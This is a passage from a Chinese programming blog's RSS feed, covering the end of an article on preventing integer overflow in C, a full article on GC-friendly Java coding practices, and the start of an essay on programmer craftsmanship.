<pre class="EnlighterJSRAW" data-enlighter-language="c"> void foo(int m, int n)
{
    size_t s = m + n;
    if ( m&gt;0 &amp;&amp; n&gt;0 &amp;&amp; (SIZE_MAX - m &lt; n) ){
        //error handling...
    }
}</pre>
<p>上面的代码中，大家要注意 <strong>(SIZE_MAX – m &lt; n)</strong> 这个判断，为什么不用m + n &gt; SIZE_MAX呢？因为，如果 m + n 溢出后，就被截断了，所以表达式恒真，也就检测不出来了。另外，这个表达式中，m和n分别会被提升为unsigned。</p>
<p>但是上面的代码是错的，因为：</p>
<p style="padding-left: 30px;">1）检查的太晚了，if之前编译器的undefined行为就已经出来了（你不知道什么会发生）。</p>
<p style="padding-left: 30px;">2）就像前面说的一样，(SIZE_MAX – m &lt; n) 可能会被编译器优化掉。</p>
<p style="padding-left: 30px;">3）另外，SIZE_MAX是size_t的最大值，size_t在64位系统下是64位的，严谨点应该用INT_MAX或是UINT_MAX</p>
<p> 所以，正确的代码应该是下面这样：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c"> void foo(int m, int n)
{
    size_t s = 0;
    if ( m&gt;0 &amp;&amp; n&gt;0 &amp;&amp; ( UINT_MAX - m &lt; n ) ){
        //error handling...
        return;
    }
    s = (size_t)m + (size_t)n;
}</pre>
<p>在《<a href="https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf" target="_blank" rel="noopener noreferrer">苹果安全编码规范</a>》（PDF）中，第28页的代码中：</p>
<p><img alt="image placeholder" ></p>
<p>如果n和m都是signed int，那么这段代码是错的。正确的应该像上面的那个例子一样，至少要在n<em>m时要把 n 和 m 给 cast 成 size_t。因为，n</em>m可能已经溢出了，已经undefined了，undefined的代码转成size_t已经没什么意义了。（如果m和n是unsigned int，也会溢出），上面的代码仅在m和n是size_t的时候才有效。</p>
<p>不管怎么说，《<a href="https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf" target="_blank" rel="noopener noreferrer">苹果安全编码规范</a>》绝对值得你去读一读。</p>
<h5>
<span class="ez-toc-section" id="%E4%BA%8C%E5%88%86%E5%8F%96%E4%B8%AD%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E6%BA%A2%E5%87%BA"></span>二分取中搜索算法中的溢出<span class="ez-toc-section-end"></span>
</h5>
<p>我们再来看一个二分取中搜索算法（binary search），大多数人都会写成下面这个样子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int binary_search(int a[], int len, int key)
{
    int low = 0; 
    int high = len - 1; 

    while ( low&lt;=high ) {
        int mid = (low + high)/2;
        if (a[mid] == key) {
            return mid;
        }
        if (key &lt; a[mid]) {
            high = mid - 1;
        }else{
            low = mid + 1;
        }
    }
    return -1;
}</pre>
<p>上面这个代码中，你可能会有这样的想法：</p>
<p>1） 我们应该用size_t来做len, low, high, mid这些变量的类型。没错，应该是这样的。但是如果这样，你要小心第四行 int high = len -1; 如果len为0，那么就“high大发了”。</p>
<p>2） 无论你用不用size_t。我们在计算mid = (low+high)/2; 的时候，(low + high) 都可以溢出。正确的写法应该是：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int mid = low + (high - low)/2;</pre>
<h5>
<span class="ez-toc-section" id="%E4%B8%8A%E6%BA%A2%E5%87%BA%E5%92%8C%E4%B8%8B%E6%BA%A2%E5%87%BA%E7%9A%84%E6%A3%80%E6%9F%A5"></span>上溢出和下溢出的检查<span class="ez-toc-section-end"></span>
</h5>
<p>前面的代码只判断了正数的上溢出overflow，没有判断负数的下溢出underflow。让们来看看怎么判断：</p>
<p>对于加法，还好。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">#include &lt;limits.h&gt;

void f(signed int si_a, signed int si_b) {
    signed int sum;
    if (((si_b &gt; 0) &amp;&amp; (si_a &gt; (INT_MAX - si_b))) ||
        ((si_b &lt; 0) &amp;&amp; (si_a &lt; (INT_MIN - si_b)))) {
        /* Handle error */
        return;
    }
    sum = si_a + si_b;
}</pre>
<p>对于乘法，就会很复杂（下面的代码太夸张了）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">void func(signed int si_a, signed int si_b)
{
  signed int result;
  if (si_a &gt; 0) {  /* si_a is positive */
    if (si_b &gt; 0) {  /* si_a and si_b are positive */
      if (si_a &gt; (INT_MAX / si_b)) {
        /* Handle error */
      }
    } else { /* si_a positive, si_b nonpositive */
      if (si_b &lt; (INT_MIN / si_a)) {
        /* Handle error */
      }
    } /* si_a positive, si_b nonpositive */
  } else { /* si_a is nonpositive */
    if (si_b &gt; 0) { /* si_a is nonpositive, si_b is positive */
      if (si_a &lt; (INT_MIN / si_b)) {
        /* Handle error */
      }
    } else { /* si_a and si_b are nonpositive */
      if ( (si_a != 0) &amp;&amp; (si_b &lt; (INT_MAX / si_a))) {
        /* Handle error */
      }
    } /* End if si_a and si_b are nonpositive */
  } /* End if si_a is nonpositive */

  result = si_a * si_b;
}</pre>
<p>更多的防止在操作中整型溢出的安全代码可以参看《<a href="https://www.securecoding.cert.org/confluence/display/seccode/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow">INT32-C. Ensure that operations on signed integers do not result in overflow</a>》</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>对于C++来说，你应该使用STL中的numeric_limits::max() 来检查溢出。</p>
<p>另外，微软的SafeInt类是一个可以帮你远理上面这些很tricky的类，下载地址：<a href="https://safeint.codeplex.com/" target="_blank" rel="noopener noreferrer">http://safeint.codeplex.com/</a></p>
<p>对于Java 来说，一种是用JDK 1.7中Math库下的safe打头的函数，如safeAdd()和safeMultiply()，另一种用更大尺寸的数据类型，最大可以到BigInteger。</p>
<p>可见，写一个安全的代码并不容易，尤其对于C/C++来说。对于黑客来说，他们只需要搜一下开源软件中代码有memcpy/strcpy之类的地方，然后看一看其周边的代码，是否可以通过用户的输入来影响，如果有的话，你就惨了。</p>
<p><strong>参考</strong>：</p>
<ul>
<li><a href="http://phrack.org/issues/60/10.html" target="_blank" rel="noopener noreferrer">Basic Integer Overflow</a></li>
</ul>
<ul>
<li><a href="https://www.owasp.org/index.php/Integer_overflow" target="_blank" rel="noopener noreferrer">OWASP：Integer overflow</a></li>
</ul>
<ul>
<li><a href="https://www.kb.cert.org/vuls/id/162289" target="_blank" rel="noopener noreferrer">C compilers may silently discard some wraparound checks</a></li>
</ul>
<ul>
<li><a href="https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/SecureCodingGuide.pdf" target="_blank" rel="noopener noreferrer">Apple Secure Coding Guide</a></li>
</ul>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Undefined_behavior" target="_blank" rel="noopener noreferrer">Wikipedia: Undefined Behavior</a></li>
</ul>
<ul>
<li>
<p id="title-text" class="with-breadcrumbs"><a href="https://www.securecoding.cert.org/confluence/display/seccode/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow">INT32-C. Ensure that operations on signed integers do not result in overflow</a></p>
</li>
</ul>
<p>最后， 不好意思，这篇文章可能罗嗦了一些，大家见谅。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-04-21T08:18:01+08:00</pubDate>
<guid>https://coolshell.cn/articles/11466.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 面向GC的Java编程 ]]></title>
<link>https://coolshell.cn/articles/11541.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 <a href="https://weibo.com/tbmujian" target="_blank">@Hesey小纯纯</a> 投稿  <a href="http://blog.hesey.net/" target="_blank">博客</a> |　<a href="http://blog.hesey.net/2014/05/gc-oriented-java-programming.html" target="_blank">原文链接</a>）</strong></p>
<p>Java程序员在编码过程中通常不需要考虑内存问题，JVM经过高度优化的GC机制大部分情况下都能够很好地处理堆(Heap)的清理问题。以至于许多Java程序员认为，我只需要关心何时创建对象，而回收对象，就交给GC来做吧！甚至有人说，如果在编程过程中频繁考虑内存问题，是一种退化，这些事情应该交给编译器，交给虚拟机来解决。</p>
<p>这话其实也没有太大问题，的确，大部分场景下关心内存、GC的问题，显得有点“杞人忧天”了，高老爷说过：</p>
<p style="padding-left: 30px;">过早优化是万恶之源。</p>
<p>但另一方面，<strong>什么才是“过早优化”？</strong></p>
<p style="padding-left: 30px;">If we could do things right for the first time, why not?</p>
<p>事实上<strong>JVM的内存模型</strong>( <a href="http://www.cs.umd.edu/~pugh/java/memoryModel/" target="_blank">JMM</a> )理应是Java程序员的基础知识，处理过几次JVM线上内存问题之后就会很明显感受到，很多系统问题，都是内存问题。</p>
<p>对JVM内存结构感兴趣的同学可以看下 <a href="http://blog.hesey.net/2011/04/introduction-to-java-virtual-machine.html" target="_blank">浅析Java虚拟机结构与机制</a> 这篇文章，本文就不再赘述了，本文也并不关注具体的GC算法，相关的文章汗牛充栋，随时可查。</p>
<p>另外，不要指望GC优化的这些技巧，可以对应用性能有成倍的提高，特别是对I/O密集型的应用，或是实际落在YoungGC上的优化，可能效果只是帮你减少那么一点YoungGC的频率。</p>
<p>但我认为，<strong>优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著</strong>，就像前面说的，<strong>如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？</strong><span id="more-11541"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81GC%E5%88%86%E4%BB%A3%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%81%87%E8%AE%BE" title="一、GC分代的基本假设">一、GC分代的基本假设</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BA%8C%E3%80%81%E5%AF%B9%E8%B1%A1%E5%88%86%E9%85%8D%E7%9A%84%E4%BC%98%E5%8C%96" title="二、对象分配的优化">二、对象分配的优化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%89%E3%80%81%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%A5%BD%E5%A4%84" title="三、不可变对象的好处">三、不可变对象的好处</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%9B%E3%80%81%E5%BC%95%E7%94%A8%E7%BD%AE%E4%B8%BAnull%E7%9A%84%E4%BC%A0%E8%AF%B4" title="四、引用置为null的传说">四、引用置为null的传说</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%BA%94%E3%80%81%E6%89%8B%E5%8A%A8%E6%A1%A3%E7%9A%84GC" title="五、手动档的GC">五、手动档的GC</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%AD%E3%80%81%E6%8C%87%E5%AE%9A%E5%AE%B9%E5%99%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E5%A4%A7%E5%B0%8F" title="六、指定容器初始化大小">六、指定容器初始化大小</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%B8%83%E3%80%81%E5%AF%B9%E8%B1%A1%E6%B1%A0" title="七、对象池">七、对象池</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%AB%E3%80%81%E5%AF%B9%E8%B1%A1%E4%BD%9C%E7%94%A8%E5%9F%9F" title="八、对象作用域">八、对象作用域</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E4%B9%9D%E3%80%81%E5%90%84%E7%B1%BB%E5%BC%95%E7%94%A8" title="九、各类引用">九、各类引用</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81GC%E5%88%86%E4%BB%A3%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%81%87%E8%AE%BE"></span>一、GC分代的基本假设<span class="ez-toc-section-end"></span>
</h4>
<p>大部分GC算法，都将堆内存做分代(Generation)处理，但是为什么要分代呢，又为什么不叫内存分区、分段，而要用面向时间、年龄的“代”来表示不同的内存区域？</p>
<p>GC分代的<strong>基本假设</strong>是：</p>
<p style="padding-left: 30px;"><strong>绝大部分对象的生命周期都非常短暂，存活时间短。</strong></p>
<p>而这些短命的对象，恰恰是GC算法需要首先关注的。所以在大部分的GC中，YoungGC（也称作MinorGC）占了绝大部分，对于负载不高的应用，可能跑了数个月都不会发生FullGC。</p>
<p>基于这个前提，在编码过程中，我们应该<strong>尽可能地缩短对象的生命周期</strong>。在过去，分配对象是一个比较重的操作，所以有些程序员会尽可能地减少new对象的次数，尝试减小堆的分配开销，减少内存碎片。</p>
<p>但是，短命对象的创建在JVM中比我们想象的性能更好，所以，不要吝啬new关键字，大胆地去new吧。</p>
<p>当然前提是不做无谓的创建，对象创建的速率越高，那么GC也会越快被触发。</p>
<p>结论：</p>
<ul>
<li>分配小对象的开销分享小，不要吝啬去创建。</li>
<li>GC最喜欢这种小而短命的对象。</li>
<li>让对象的生命周期尽可能短，例如在方法体内创建，使其能尽快地在YoungGC中被回收，不会晋升(romote)到年老代(Old Generation)。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E5%AF%B9%E8%B1%A1%E5%88%86%E9%85%8D%E7%9A%84%E4%BC%98%E5%8C%96"></span>二、对象分配的优化<span class="ez-toc-section-end"></span>
</h4>
<p>基于大部分对象都是小而短命，并且不存在多线程的数据竞争。这些小对象的分配，会优先在线程私有的<strong> TLAB</strong> 中分配，TLAB中创建的对象，不存在锁甚至是CAS的开销。</p>
<p>TLAB占用的空间在Eden Generation。</p>
<p>当对象比较大，TLAB的空间不足以放下，而JVM又认为当前线程占用的TLAB剩余空间还足够时，就会直接在Eden Generation上分配，此时是存在并发竞争的，所以会有CAS的开销，但也还好。</p>
<p>当对象大到Eden Generation放不下时，JVM只能尝试去Old Generation分配，这种情况需要尽可能避免，因为一旦在Old Generation分配，这个对象就只能被Old Generation的GC或是FullGC回收了。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%A5%BD%E5%A4%84"></span>三、不可变对象的好处<span class="ez-toc-section-end"></span>
</h4>
<p>GC算法在扫描存活对象时通常需要从ROOT节点开始，扫描所有存活对象的引用，构建出对象图。</p>
<p>不可变对象对GC的优化，主要体现在Old Generation中。</p>
<p>可以想象一下，如果存在Old Generation的对象引用了Young Generation的对象，那么在每次YoungGC的过程中，就必须考虑到这种情况。</p>
<p>Hotspot JVM为了提高YoungGC的性能，避免每次YoungGC都扫描Old Generation中的对象引用，采用了 <strong>卡表(Card Table) </strong>的方式。</p>
<p>简单来说，当Old Generation中的对象发生对Young Generation中的对象产生新的引用关系或释放引用时，都会在卡表中响应的标记上标记为脏(dirty)，而YoungGC时，只需要扫描这些dirty的项就可以了。</p>
<p>可变对象对其它对象的引用关系可能会频繁变化，并且有可能在运行过程中持有越来越多的引用，特别是容器。这些都会导致对应的卡表项被频繁标记为dirty。</p>
<p>而不可变对象的引用关系非常稳定，在扫描卡表时就不会扫到它们对应的项了。</p>
<p>注意，这里的不可变对象，不是指仅仅自身引用不可变的final对象，而是真正的<strong><span style="color: #ff0000;">Immutable Objects</span></strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E5%BC%95%E7%94%A8%E7%BD%AE%E4%B8%BAnull%E7%9A%84%E4%BC%A0%E8%AF%B4"></span>四、引用置为null的传说<span class="ez-toc-section-end"></span>
</h4>
<p>早期的很多Java资料中都会提到在方法体中将一个变量置为null能够优化GC的性能，类似下面的代码：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">List&lt;String&gt; list = new ArrayList&lt;String&gt;();
// some code
list = null; // help GC
</pre>
<p>事实上这种做法对GC的帮助微乎其微，有时候反而会导致代码混乱。</p>
<p>我记得几年前 @rednaxelafx 在HLL VM小组中详细论述过这个问题，原帖我没找到，结论基本就是：</p>
<ul>
<li>在一个非常大的方法体内，对一个较大的对象，将其引用置为null，某种程度上可以帮助GC。</li>
<li>大部分情况下，这种行为都没有任何好处。</li>
</ul>
<p>所以，还是早点放弃这种“优化”方式吧。</p>
<p>GC比我们想象的更聪明。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%94%E3%80%81%E6%89%8B%E5%8A%A8%E6%A1%A3%E7%9A%84GC"></span>五、手动档的GC<span class="ez-toc-section-end"></span>
</h4>
<p>在很多Java资料上都有下面两个奇技淫巧：</p>
<ul>
<li>通过<strong>Thread.yield()</strong>让出CPU资源给其它线程。</li>
<li>通过<strong>System.gc()</strong>触发GC。</li>
</ul>
<p>事实上JVM从不保证这两件事，而System.gc()在JVM启动参数中如果允许显式GC，则会<strong>触发FullGC</strong>，对于响应敏感的应用来说，几乎等同于自杀。</p>
<p>So，让我们牢记两点：</p>
<ul>
<li>Never use Thread.yield()。</li>
<li>Never use System.gc()。除非你真的需要回收Native Memory。</li>
</ul>
<p>第二点有个Native Memory的例外，如果你在以下场景：</p>
<ul>
<li>使用了NIO或者NIO框架（Mina/Netty）</li>
<li>使用了DirectByteBuffer分配字节缓冲区</li>
<li>使用了MappedByteBuffer做内存映射</li>
</ul>
<p>由于<strong>Native Memory只能通过FullGC（或是CMS GC）回收</strong>，所以除非你非常清楚这时真的有必要，否则不要轻易调用System.gc()，且行且珍惜。</p>
<p>另外为了防止某些框架中的System.gc调用（例如NIO框架、Java RMI），建议在启动参数中加上-XX:+DisableExplicitGC来禁用显式GC。</p>
<p>这个参数有个巨大的坑，如果你禁用了System.gc()，那么上面的3种场景下的内存就无法回收，可能造成OOM，如果你使用了CMS GC，那么可以用这个参数替代：-XX:+ExplicitGCInvokesConcurrent。</p>
<p>关于System.gc()，可以参考 @bluedavy 的几篇文章：</p>
<ul>
<li><a href="http://hellojava.info/?p=56" target="_blank">CMS GC会不会回收Direct ByteBuffer的内存</a></li>
<li><a href="http://hellojava.info/?p=323" target="_blank">说说在Java启动参数上我犯的错</a></li>
<li><a href="http://hellojava.info/?p=319" target="_blank">java.lang.OutOfMemoryError:Map failed</a></li>
</ul>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%AD%E3%80%81%E6%8C%87%E5%AE%9A%E5%AE%B9%E5%99%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E5%A4%A7%E5%B0%8F"></span>六、指定容器初始化大小<span class="ez-toc-section-end"></span>
</h4>
<p>Java容器的一个特点就是可以动态扩展，所以通常我们都不会去考虑初始大小的设置，不够了反正会自动扩容呗。</p>
<p>但是扩容不意味着没有代价，甚至是很高的代价。</p>
<p>例如一些基于数组的数据结构，例如StringBuilder、StringBuffer、ArrayList、HashMap等等，在扩容的时候都需要做ArrayCopy，对于不断增长的结构来说，经过若干次扩容，会存在大量无用的老数组，而回收这些数组的压力，全都会加在GC身上。</p>
<p>这些容器的构造函数中通常都有一个可以指定大小的参数，如果对于某些大小可以预估的容器，建议加上这个参数。</p>
<p>可是因为容器的扩容并不是等到容器满了才扩容，而是有一定的比例，例如HashMap的扩容阈值和负载因子(loadFactor)相关。</p>
<p>Google Guava框架对于容器的初始容量提供了非常便捷的工具方法，例如：</p>
<p>[code lang=”java”]Lists.newArrayListWithCapacity(initialArraySize);</p>
<p>Lists.newArrayListWithExpectedSize(estimatedSize);</p>
<p>Sets.newHashSetWithExpectedSize(expectedSize);</p>
<p>Maps.newHashMapWithExpectedSize(expectedSize);<br>
[/code]</p>
<p>这样我们只要传入预估的大小即可，容量的计算就交给Guava来做吧。</p>
<p><strong>反例</strong>：如果采用默认无参构造函数，创建一个ArrayList，不断增加元素直到OOM，那么在此过程中会导致：</p>
<ul>
<li>多次数组扩容，重新分配更大空间的数组</li>
<li>多次数组拷贝</li>
<li>内存碎片</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%B8%83%E3%80%81%E5%AF%B9%E8%B1%A1%E6%B1%A0"></span>七、对象池<span class="ez-toc-section-end"></span>
</h4>
<p>为了减少对象分配开销，提高性能，可能有人会采取对象池的方式来缓存对象集合，作为复用的手段。</p>
<p>但是对象池中的对象由于在运行期长期存活，大部分会晋升到Old Generation，因此无法通过YoungGC回收。</p>
<p>并且通常……没有什么效果。</p>
<p>对于对象本身：</p>
<ul>
<li>如果对象很小，那么分配的开销本来就小，对象池只会增加代码复杂度。</li>
<li>如果对象比较大，那么晋升到Old Generation后，对GC的压力就更大了。</li>
</ul>
<p>从线程安全的角度考虑，通常池都是会被并发访问的，那么你就需要处理好同步的问题，这又是一个大坑，并且<strong>同步带来的开销，未必比你重新创建一个对象小</strong>。</p>
<p>对于对象池，唯一合适的场景就是<strong>当池中的每个对象的创建开销很大</strong>时，缓存复用才有意义，例如每次new都会创建一个连接，或是依赖一次RPC。</p>
<p>比如说：</p>
<ul>
<li>线程池</li>
<li>数据库连接池</li>
<li>TCP连接池</li>
</ul>
<p>即使你真的需要实现一个对象池，也请使用成熟的开源框架，例如Apache Commons Pool。</p>
<p>另外，使用JDK的ThreadPoolExecutor作为线程池，不要重复造轮子，除非当你看过AQS的源码后认为你可以写得比Doug Lea更好。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%AB%E3%80%81%E5%AF%B9%E8%B1%A1%E4%BD%9C%E7%94%A8%E5%9F%9F"></span>八、对象作用域<span class="ez-toc-section-end"></span>
</h4>
<p>尽可能缩小对象的作用域，即生命周期。</p>
<ul>
<li>如果可以在方法内声明的局部变量，就不要声明为实例变量。</li>
<li>除非你的对象是单例的或不变的，否则尽可能少地声明static变量。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%B9%9D%E3%80%81%E5%90%84%E7%B1%BB%E5%BC%95%E7%94%A8"></span>九、各类引用<span class="ez-toc-section-end"></span>
</h4>
<p>java.lang.ref.Reference有几个子类，用于处理和GC相关的引用。JVM的引用类型简单来说有几种：</p>
<ul>
<li>Strong Reference，最常见的引用</li>
<li>Weak Reference，当没有指向它的强引用时会被GC回收</li>
<li>Soft Reference，只当临近OOM时才会被GC回收</li>
<li>Phantom Reference，主要用于识别对象被GC的时机，通常用于做一些清理工作</li>
</ul>
<p>当你需要实现一个缓存时，可以考虑优先使用WeakHashMap，而不是HashMap，当然，更好的选择是使用框架，例如Guava Cache。</p>
<p>最后，再次提醒，以上的这些未必可以对代码有多少性能上的提升，但是熟悉这些方法，是为了帮助我们写出更卓越的代码，和GC更好地合作。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-05-07T11:24:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/11541.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 「我只是认真」聊聊工匠情怀 ]]></title>
<link>https://coolshell.cn/articles/11629.html</link>
<content><![CDATA[ 
<p><strong style="color: #555555;">（感谢网友 <a style="color: #2970a6;" href="https://weibo.com/tbmujian" target="_blank">@Hesey小纯纯</a> 投稿  <a style="color: #2970a6;" href="http://blog.hesey.net/" target="_blank">博客</a> |　<a style="color: #2970a6;" href="http://blog.hesey.net/2014/05/im-just-conscientious-talking-about-feelings-of-artisans.html" target="_blank">原文链接</a>）</strong></p>
<p>老罗的Smartisan T1手机发布会很多人应该都看了，发布会的最后老罗凝视着自己的工匠自画像，半晌没说话，随后转过身，慢慢离开舞台，屏幕下方只留下一句话：</p>
<p style="padding-left: 30px;"><strong>我不是为了输赢，我就是认真。</strong></p>
<p>这一瞬间让我想起93年「狮城舌战」的主角蒋昌建，在「人性本善还是人性本恶」的总结陈词最后，以顾城的名句，「黑夜给了我黑色的眼睛，我却用它寻找光明」，把整个辩论赛的氛围推向高潮。</p>
<p>而老罗的这句话，和这句话背后的工匠背景，却以另外一种<strong>无声的却震人心魄的力量</strong>，敲打着每一个在场的，或是观看着整个发布会的观众的心绪。</p>
<p>「工匠情怀」，我深有体会，就像我在 <a href="http://blog.hesey.net/2014/05/gc-oriented-java-programming.html" target="_blank">面向GC的Java编程</a> 一文中所提到的：</p>
<p style="padding-left: 30px;"><strong>优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。</strong></p>
<p style="padding-left: 30px;"><strong>如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？</strong></p>
<p>追求卓越，追求完美，追求细节的极致。小时候看到那些修表匠，握着一个小螺丝刀，或是看着电工，用烙铁沾着锡和松香，在那一小寸的世界里，把坏了的地方修好，那种专注的眼神，觉得很厉害。</p>
<p>现在再去回想那些工匠工作的场景，越发觉得钦佩。在我老家有一家刻章的店，在我上幼儿园的时候就已经在那开了很多年了。前段时间需要刻一个章，发现那家店还在，于是走进去，门口坐着一个老人，我确实记不得当年是不是他，不过看这岁数八九不离十。我以前在别的地方刻的章，都是在电脑里设计完图案后，激光刻蚀。但那次老人却是用的手刻，我着实惊呆了。只看他拿出一块红色的印底，右手持着刻刀，开始一下一下地刻着。虽然老人连话都不怎么说得清了，但是工作时那专注的神情，和精湛的手艺，以及最后成品那比机器更完美的效果，着实让我心里非常动容。</p>
<p><span id="more-11629"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81%E6%8A%80%E6%9C%AF%E4%BA%BA%E7%9A%84%E6%89%A7%E7%9D%80" title="一、技术人的执着">一、技术人的执着</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BA%8C%E3%80%81%E6%8B%BE%E8%B5%B7%E5%88%9D%E8%A1%B7" title="二、拾起初衷">二、拾起初衷</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%89%E3%80%81%E5%8F%91%E7%8E%B0%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%87%AA%E5%B7%B1" title="三、发现更好的自己">三、发现更好的自己</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%9B%E3%80%81%E7%BB%86%E8%8A%82%E6%98%AF%E9%AD%94%E9%AC%BC" title="四、细节是魔鬼">四、细节是魔鬼</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E6%8A%80%E6%9C%AF%E4%BA%BA%E7%9A%84%E6%89%A7%E7%9D%80"></span>一、技术人的执着<span class="ez-toc-section-end"></span>
</h4>
<p>我见过很多人，也见过很多程序员，都有如此的「工匠情怀」。</p>
<p>做产品需求评审，有的人善于快速提供技术解决方案，在最短的时间内解决问题。</p>
<p>但我见过的很多牛人，他们除了能在脑海里最快地形成方案原型，并且更深入地考虑各种细节点，最终能给出一个更趋于完善的技术方案。</p>
<p>在他们身上，我看到了<strong>对这项职业的自我尊重，对自我价值的追求，也有对「卓越」的理解和渴求</strong>。</p>
<p>《精通正则表达式》的译者余晟老师写过他和正则表达式的 <a href="http://www.luanxiang.org/blog/archives/1717.html" target="_blank">缘起</a> 。只是因为项目经理让他「多用Google，查查正则表达式的资料」，余老师打开了正则的大门，读完了英文原版的《Mastering Regular Expression》，如今成为了国内最了解正则表达式的人之一。</p>
<p>看完那篇文章其实我想起了我的实习经历。那时候我刚去公司两三天，有一天我老板找我让我研究一下如何用Java里的MappedByteBuffer做文件内存映射来读取大文件。尽管我们当时要处理的文件很大，以我在学校编码的经验看，用普通的Reader也是可以很好地解决的。</p>
<p>于是我说，「这个其实用Reader也能做，更简单一些，没那么麻烦。」</p>
<p>老板反问我，「什么叫没那么麻烦，这是一个做技术的人的态度吗？」</p>
<p>那几天我花了很多时间，去从Linux一直到JVM，去了解什么是内存映射，底层原理是什么，和其它技术的比较、优缺点，并和其它几种读文件的技术做了性能对比。</p>
<p>虽然最后项目没有采用这个方案，但是那句反问直到现在一直在我脑海里，时时地提醒我：「<strong>做技术的人，对待技术，应该拥有什么样的态度？</strong>」</p>
<p>所以其实我很感谢我的老板，以前他教我们这些新人优秀的职场习惯，有一条是每天的邮件必须没有未读数，即便是不需要阅读的邮件，也要一键置为已读，不要留一个未读的数字在那。现在想起来，有点像iOS App右上角那个提醒数的角标，有些强迫症的人怎么也忍受不了有个红圈圈在那。开个玩笑，虽然有些习惯看起来可有可无，无关紧要，但这确实映射了一种态度和思维习惯。</p>
